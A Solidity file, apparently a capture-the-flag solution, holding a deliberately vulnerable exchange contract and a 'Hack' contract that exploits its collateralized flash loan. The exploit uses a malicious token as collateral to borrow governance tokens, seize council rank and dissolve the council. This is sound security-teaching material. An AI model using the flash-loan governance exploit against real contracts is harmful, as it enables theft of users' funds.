// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./CouncilOfApes.sol";
import "./TotallyNotCopiedToken.sol";
import "./EvilToken.sol";
contract IcyExchange
{
    TotallyNotCopiedToken public icyToken;
    CouncilOfApes public council;
    mapping (address => IcyPool) pools;
    mapping (address => mapping(IERC20 => uint256)) public liquidity;
    uint256 poolCounter;

    modifier onlyApe
    {
        require(council.getMemberClass(msg.sender) >= CouncilOfApes.apeClass.APE);
        _;
    }

    constructor() payable
    {
        require (msg.value == 5 ether, "You must pay 5 Ether to create the exchange");
        icyToken = new TotallyNotCopiedToken(address(this), "IcyToken", "ICY");
        council = new CouncilOfApes(address(icyToken));
    }

    //---------------------------- Public Functions ----------------------------//

    function createPool(address token) onlyApe() payable external
    {
        require(msg.value == 1 ether, "You must pay 1 Ether to create a pool");

        //Check if pool already exists
        require(address(pools[token]) == address(0), "This pool already exists");

        //Create the pool and add it to the pools mapping
        pools[token] = new IcyPool(address(icyToken), token);
        
        //Every pool needs to be initialized with 100,000 of the chosen tokens and will get 100,000 of the icyToken
        IERC20(token).transferFrom(msg.sender, address(pools[token]), 100_000);
        icyToken.transfer(address(pools[token]), 100_000);
    }

    function swap(address fromToken, address toToken, uint256 amount) onlyApe() external
    {
        require(amount > 0, "You must swap at least 1 token");

        IcyPool pool;

        if(fromToken == address(icyToken))
        {
            pool = pools[toToken];
        }
        else if (toToken == address(icyToken))
        {
            pool = pools[fromToken]; 
        }

        pool.swap(msg.sender, fromToken, toToken, amount);
    }

    //---------------------------- Lending Functions ----------------------------//

    //We offer the worlds first collateralized flash loan (even safer than anything else)
    function collateralizedFlashloan(address collateralToken, uint256 amount, address target) onlyApe() external
    {
        require(amount > 0, "You must lend out at least 1 token");
        require(amount <= icyToken.balanceOf(address(this)), "We can't lend you this much");
        require(IERC20(collateralToken).totalSupply() <= 100_000_000, "Shitcoins are not accepted");
        require(address(pools[collateralToken]) != address(0), "This pool does not exist");

        uint256 neededCollateral = pools[collateralToken].getTokensPerIcyToken(amount);
        require(neededCollateral <= 100_000_000, "Shitcoins are still not accepted, don't try to cheat us");

        // audit-info neededCollateral = 99_999
        //Receive the collateral
        IERC20(collateralToken).transferFrom(msg.sender, address(this), neededCollateral);

        //Flashloan happens
        icyToken.transfer(msg.sender, amount);

        //You get to do stuff
        (bool success, ) = target.call(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));
        require(success);

        //By here we should get all our money back
        icyToken.transferFrom(msg.sender, address(this), amount);

        //Return the collateral
        IERC20(collateralToken).transfer(msg.sender, neededCollateral);
    }

    //---------------------------- View Functions ----------------------------//

    function getPoolCount() public view returns (uint256)
    {
        return poolCounter;
    }

    function getPool(address token) public view returns (IcyPool)
    {
        return pools[token];
    }
}



contract Hack {
    IcyExchange target;

    constructor(IcyExchange _target) {
        target = _target;
    }

    function hack() external payable{
        require(msg.value == 1 ether, "You must provide 1 ether to start the exploit");
        EvilToken hackToken = new EvilToken(address(this), "HackToken", "HT");
        hackToken.approve(address(target), 199_999);
        
        target.council().becomeAnApe(keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing"));
        target.createPool{value: msg.value}(address(hackToken));

        target.collateralizedFlashloan(address(hackToken), 1_000_000_000, address(this));

        target.council().dissolveCouncilOfTheApes(keccak256("Kevin come out of the basement, dinner is ready."));
    }

    function receiveFlashLoan(uint256 _amount) external {
        target.icyToken().approve(address(target.council()), 1_000_000_000);
        target.council().buyBanana(1_000_000_000);

        target.council().vote(address(this), 1_000_000_000);

        target.council().claimNewRank();

        target.council().issueBanana(1_000_000_000, address(this));
        target.council().sellBanana(1_000_000_000);

        target.icyToken().approve(address(target), 1_000_000_000);
    }
}